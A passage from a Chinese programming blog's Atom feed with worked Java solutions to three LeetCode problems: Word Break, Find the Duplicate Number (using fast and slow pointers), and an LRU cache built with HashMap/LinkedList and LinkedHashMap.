    <content type="html"><![CDATA[<p>给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。</p><p>说明：</p><p>拆分时可以重复使用字典中的单词。<br>你可以假设字典中没有重复的单词。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/word-break" target="_blank" rel="noopener">https://leetcode-cn.com/problems/word-break</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>方法一、分治法</p><p>这个问题可以用分治法来解决，分治法的关键在于划分子问题。</p><p>分治三步：分解-&gt;解决-&gt;合并</p><ul><li><p>分解：假设字符串为s长度为len。分解点为j（1-len-1），子问题：s[0,j) 、s[j,len)。</p></li><li><p>解决： 对于每一个子问题s。如果s在wordDict中，则返回true，否则分解为子问题继续查找。</p></li><li><p>合并：两个子问题均为true才能为true。对于j从0-len，如果存在一个j，则结果返回true.</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(wordDict.contains(s))&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;s.length();j++)&#123;</span><br><span class="line">           <span class="keyword">boolean</span> res1 = wordBreak(s.substring(<span class="number">0</span>,j),wordDict);</span><br><span class="line">           <span class="keyword">boolean</span> res2 = wordBreak(s.substring(j),wordDict);</span><br><span class="line">           <span class="keyword">if</span>(res1&amp;&amp;res2)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这种分治法有很多子问题重叠，所以需要优化，可以利用HashMap来记忆化搜索。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String,Boolean&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(hashMap.containsKey(s))&#123;</span><br><span class="line">            <span class="keyword">return</span> hashMap.get(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(wordDict.contains(s))&#123;</span><br><span class="line">            hashMap.put(s,<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;s.length();j++)&#123;</span><br><span class="line">            <span class="keyword">boolean</span> res1 = wordBreak(s.substring(<span class="number">0</span>,j),wordDict);</span><br><span class="line">            <span class="keyword">boolean</span> res2 = wordBreak(s.substring(j),wordDict);</span><br><span class="line">            <span class="keyword">if</span>(res1&amp;&amp;res2)&#123;</span><br><span class="line">                hashMap.put(s,<span class="keyword">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        hashMap.put(s,<span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200526110315840.png" alt="image-20200526110315840"></p><p>方法二、动态规划方法：</p><p>设dp[i]为从第0点到第i点的字符串是否满足要求。注意dp[0]=0。因为空字符串一定在单词列表中。</p><p>转移方程：</p><p><img src="/assets/image-20200526110151858.png" alt="image-20200526110151858"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给定一个非空字符串 s 和一个包含非空单词列表的字典 wordDict，判定 s 是否可以被空格拆分为一个或多个在字典中出现的单词。&lt;/p&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;拆分时可以重复使用字典中的单词。&lt;br&gt;你可以假设字典中没有重复的单词。&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/word-break&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/word-break&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode287-寻找重复数</title>
    <link href="http://blog.ydq6.com/uncategorized/Leetcode287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/"/>
    <id>http://blog.ydq6.com/uncategorized/Leetcode287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/</id>
    <published>2020-05-26T00:55:44.000Z</published>
    <updated>2020-05-26T02:10:54.018Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。</p><p>说明：</p><p>不能更改原数组（假设数组是只读的）。<br>只能使用额外的 O(1) 的空间。<br>时间复杂度小于 O(n**2) 。<br>数组中只有一个重复的数字，但它可能不止重复出现一次。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/find-the-duplicate-number" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-the-duplicate-number</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>方案一、不考虑题目要求可以直接用一个hash表（Map）来存储映射，找到重复的即可，时间复杂度O(n),空间复杂度O(n)。</p><p>方案二、如果考虑题目要求空间复杂度为O(1)，时间复杂度小于o(n**2)。可以先用o(nlogn)的排序，再遍历一遍数组，遍历时找到与后面个数相等的数即可。</p><p>但是注意题目有个要求，不能更改原数组，所以排序方案不可行。再看看题目，n+1个整数的数组，数字都在1-n之间，可以想着鸽巢原理，鸽巢原理也可以转化为有向图。</p><p>数组转有向图：i指向(nums[i])。</p><p>假设数组为[1,3,4,2,2]。链表如下所示。</p><p><img src="/assets/image-20200526095419163.png" alt="image-20200526095419163"></p><p>可以推断出存在重复数的点，入度大于等于2。但是不一定只存在一个环。如下图所示：</p><p><img src="/assets/image-20200526095219650.png" alt="image-20200526095219650"></p><p>图是由0—k个强联通子图+一个循环链表构成。</p><p>所以我们首先把图中强连通子图排除掉就剩下一个循环链表，循环链表的入口点索引即为重复数组。</p><p>强连通子图也是一个循环链表，这里有个比较巧的方法就是判定环的入口点是否有两个或以上前驱点即可。用快慢指针方法可以判断循环链表入口点。</p><p>我们再注意一个问题，从索引0位置出发所构成的子图一定不是强连通子图，因为一定不存在nums[i]=0。所以从索引0出发一定能找到循环链表，且该循环链表的入口点一定为环入口点。</p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums.length&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> slow=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fast=<span class="number">0</span>;</span><br><span class="line">    slow = nums[slow];</span><br><span class="line">    fast = nums[nums[fast]];</span><br><span class="line">    <span class="keyword">while</span>(slow != fast)&#123;</span><br><span class="line">        slow = nums[slow];</span><br><span class="line">        fast = nums[nums[fast]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> slow2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(slow2 != slow)&#123;</span><br><span class="line">        slow = nums[slow];</span><br><span class="line">        slow2 = nums[slow2];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。&lt;/p&gt;
&lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;不能更改原数组（假设数组是只读的）。&lt;br&gt;只能使用额外的 O(1) 的空间。&lt;br&gt;时间复杂度小于 O(n**2) 。&lt;br&gt;数组中只有一个重复的数字，但它可能不止重复出现一次。&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/find-the-duplicate-number&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/find-the-duplicate-number&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Leetcode146-LRU缓存机制</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode146-LRU%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode146-LRU%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6/</id>
    <published>2020-05-25T01:30:45.000Z</published>
    <updated>2020-05-25T03:16:39.002Z</updated>
    
    <content type="html"><![CDATA[<p>运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。</p><p>获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。<br>写入数据 put(key, value) - 如果密钥已经存在，则变更其数据值；如果密钥不存在，则插入该组「密钥/数据值」。当缓存容量达到上限时，它应该在写入新数据之前删除最久未使用的数据值，从而为新的数据值留出空间。</p><p>进阶:</p><p>你是否可以在 O(1) 时间复杂度内完成这两种操作？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/lru-cache" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lru-cache</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><p>首先，LRU设计三个操作，初始化（选择数据结构），写入数据，获取数据。</p><p>分析写入数据。不存在，则插入数组。这里可以看出可以是尾插，也可以是任意位置插。容量达到上限时，还应该删除最久未使用的，所以每个数据应该还有个标志位，标志最近访问时间。</p><h2><span id="先构造一个未优化的lru">先构造一个未优化的LRU。</span></h2><p>用HashMap+LinkedList实现。</p><p>其中HashMap作为字典。LinkedList作为最近访问列表。</p><p>注意HashMap的底层数据结构为数组+链表+红黑树</p><p>LinkerList的底层数据结构为双向链表（双向队列）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Integer,Integer&gt; map;</span><br><span class="line">    LinkedList&lt;Integer&gt; accessList;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">        accessList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">        Integer value = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        accessList.remove(<span class="keyword">new</span> Integer(key));</span><br><span class="line">        accessList.add(key);</span><br><span class="line">        <span class="comment">//System.out.printf("key:%d,value:%d\n",key,value);</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        Integer oValue = map.get(key);</span><br><span class="line">        <span class="keyword">if</span>(oValue == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.size() &gt;= capacity)&#123;</span><br><span class="line">                <span class="keyword">int</span> headKey = accessList.pop();</span><br><span class="line">                map.remove(headKey);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(key,value);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(key,value);</span><br><span class="line">            accessList.remove(<span class="keyword">new</span> Integer(key));</span><br><span class="line">        &#125;</span><br><span class="line">        accessList.add(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200525103456399.png" alt="image-20200525103456399"></p><p>时间复杂度分析:</p><ul><li>get方法</li></ul><p>accessList.remove 带来o(n)的复杂度。总复杂度o(n)</p><ul><li>put方法</li></ul><p>accessList.remove 带来o(n)的复杂度。总复杂度o(n)</p><h2><span id="优化后的方法">优化后的方法</span></h2><p>在Java中有一个数据结构为LinkedHashMap。其即包含HashMap，又包含双向链表。直接利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LRUCache</span> <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>&lt;<span class="title">Integer</span>,<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> capacity;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="number">16</span>,<span class="number">0.75f</span>,<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">        Integer value = <span class="keyword">super</span>.get(key);</span><br><span class="line">        <span class="keyword">if</span>(value == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">removeEldestEntry</span><span class="params">(Map.Entry&lt;Integer,Integer&gt; eldest)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.capacity &lt; <span class="keyword">this</span>.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意一个点LinkedHashMap初始化时一定要把accessOrder属性执行为true,这样才会根据时间顺序排序。removeEldestEntry方法为移除最老的结点，在每次插入结点后调用。</p><p><img src="/assets/image-20200525111627595.png" alt="image-20200525111627595"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;运用你所掌握的数据结构，设计和实现一个  LRU (最近最少使用) 缓存机制。它应该支持以下操作： 获取数据 get 和 写入数据 put 。&lt;/p&gt;
&lt;p&gt;获取数据 get(key) - 如果密钥 (key) 存在于缓存中，则获取密钥的值（总是正数），否则返回 -1。&lt;br&gt;写入数据 put(key, value) - 如果密钥已经存在，则变更其数据值；如果密钥不存在，则插入该组「密钥/数据值」。当缓存容量达到上限时，它应该在写入新数据之前删除最久未使用的数据值，从而为新的数据值留出空间。&lt;/p&gt;
&lt;p&gt;进阶:&lt;/p&gt;
&lt;p&gt;你是否可以在 O(1) 时间复杂度内完成这两种操作？&lt;/p&gt;
&lt;p&gt;来源：力扣（LeetCode）&lt;br&gt;链接：&lt;a href=&quot;https://leetcode-cn.com/problems/lru-cache&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://leetcode-cn.com/problems/lru-cache&lt;/a&gt;&lt;br&gt;著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
